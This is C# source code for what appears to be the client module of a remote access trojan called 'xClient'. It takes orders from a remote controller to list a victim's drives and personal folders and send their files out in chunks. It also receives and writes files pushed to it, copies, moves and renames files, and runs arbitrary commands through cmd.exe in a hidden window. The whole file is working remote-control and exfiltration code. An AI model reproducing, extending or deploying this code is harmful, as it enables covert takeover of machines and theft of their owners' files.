using System;
using System.Collections.Generic;
using System.Text;
using xClient.responds;
using Jiraiya.commands;
using xClient.Utils;
using System.IO;
using xClient.Utils;
using System.Diagnostics;

namespace xClient
{
    partial class Program
    {
        static IBfileTrans fileManager = new IBfileTrans();
        public static List<tobe_file> rec_files = new List<tobe_file>();
     


        private static void handle_directories(GetDirectory cmd)
        {
            string path = cmd.dir;
            List<string> names = new List<string>();
            List<string> types = new List<string>();
            List<int> sizes = new List<int>();
            if (path == "0")
            {
                foreach(var drive in DriveInfo.GetDrives()) {
                  names.Add(drive.Name);
                  types.Add("drive");
                  sizes.Add(0);
                   }

                names.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
                types.Add("Desktop");
                sizes.Add(0);

                names.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                types.Add("MyDocuments");
                sizes.Add(0);

                names.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                types.Add("MyMusic");
                sizes.Add(0);

                names.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                types.Add("MyPictures");
                sizes.Add(0);

                names.Add(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                types.Add("Startup");
                sizes.Add(0);

                
                send_byte(resTObyte(new SendDirectory(names, types, sizes)));
                return;

            }
            else
            {
                if (!Directory.Exists(path)) return;
                string [] subdirectoryEntries = Directory.GetDirectories(path);
                foreach (string subdirectory in subdirectoryEntries)
                {
                    names.Add(subdirectory);
                    types.Add("folder");
                    sizes.Add(0);
                }
                FileInfo[] fileEntries = new DirectoryInfo(path).GetFiles();
                foreach (FileInfo file in fileEntries)
                {
                    names.Add(file.Name);
                    types.Add(file.Name.Split('.')[file.Name.Split('.').Length-1]);
                    sizes.Add((int)file.Length);
                }
                send_byte(resTObyte(new SendDirectory(names, types, sizes)));
            }

        }
      
        private static void handle_sendFile(GetFile cmd)
        {
            FileInfo f = new FileInfo(fileManager.clean_path(cmd.file));
            if (f.Length < IBfileTrans.chunk_size)
            {
                send_byte(resTObyte(new SendFile(cmd.file,
                                              File.ReadAllBytes(cmd.file),
                                              0,
                                              0,
                                              (int)f.Length
                                              )));
                return;
            }
             
            fileManager.start(cmd.file);
            send_byte(resTObyte(new SendFile(fileManager.clean_path(cmd.file),
                                              fileManager.tobe_sent,
                                              fileManager.get_chunk_num(cmd.file),
                                              fileManager.calc_num_chunks((int)f.Length),
                                              (int)f.Length
                                              )));
        }

        private static void handle_getFile(DownExec cmd)
        {
            int ind = Utils.Helpers.fileInList(rec_files, cmd.name);
            //check if the file is already in our list
            if (ind != -1)
            {

                rec_files[ind].queue.Enqueue(cmd.file_part);
                rec_files[ind].rec += cmd.file_part.Length;
            }
            else
            {
                //check if this part isn't a lost part (doesnt exist in list but doesn't start with the first part)
                if (cmd.current_part == 0)
                    rec_files.Add(new tobe_file(cmd.name, cmd.file_part, cmd.size, cmd.file_part.Length));
            }


            ind = Utils.Helpers.fileInList(rec_files, cmd.name);
            if (cmd.current_part < cmd.parts - 1)
            { //file not fully received
                //sleep for a half a second , to send the payload alone 
                System.Threading.Thread.Sleep(10);
                    send_byte(resTObyte(new UploadExec((cmd.current_part + 1) + cmd.name)));
                
            }
            else
            {//file received
              Utils.Helpers.buildFile(rec_files, cmd.name,cmd.dis);
              send_byte(resTObyte(new UploadExec(("-") + cmd.name)));
            }
        }

        private static void handle_CopyCut(DoCopyCut cmd)
        {
            for (int i = 1; i < cmd.elements.Count;i++ )
            {
                if (System.IO.File.Exists(cmd.elements[i])) { 
                if (cmd.elements[0] == "+")
                {
                    if (!System.IO.File.Exists(cmd.dis + "\\" + Utils.Helpers.getFileTitle(cmd.elements[i])))
                    {
                        System.IO.File.Copy(cmd.elements[i], cmd.dis + "\\" + Utils.Helpers.getFileTitle(cmd.elements[i]), true);
                    }
                    else
                    {
                        System.IO.File.Copy(cmd.elements[i], cmd.dis + "\\(" + Guid.NewGuid().ToString("N")+")_" + Utils.Helpers.getFileTitle(cmd.elements[i]), true);
                    }
                }
                else
                {
                    System.IO.File.Move(cmd.elements[i], cmd.dis + "\\" + Utils.Helpers.getFileTitle(cmd.elements[i]));
                }
                }
            }
            handle_directories(new GetDirectory(cmd.dis));
        }

        private static void handle_DoRename(DoRename cmd)
        {
            Console.WriteLine(cmd.old);
            if (System.IO.File.Exists(cmd.old)) {
                System.IO.File.Move(cmd.old, Utils.Helpers.getUpperPath(cmd.old)+"\\"+cmd.ne);
                handle_directories(new GetDirectory(Utils.Helpers.getUpperPath(cmd.old)));
            }
                
            else if (System.IO.Directory.Exists(cmd.old))
            {
                System.IO.Directory.Move(cmd.old, Utils.Helpers.getUpperPath(cmd.old) + "\\" + cmd.ne);
                handle_directories(new GetDirectory(Utils.Helpers.getUpperPath(cmd.old)));
            }
        }

        private static void handle_DoExecute(DoExecute cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " +cmd.ne;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
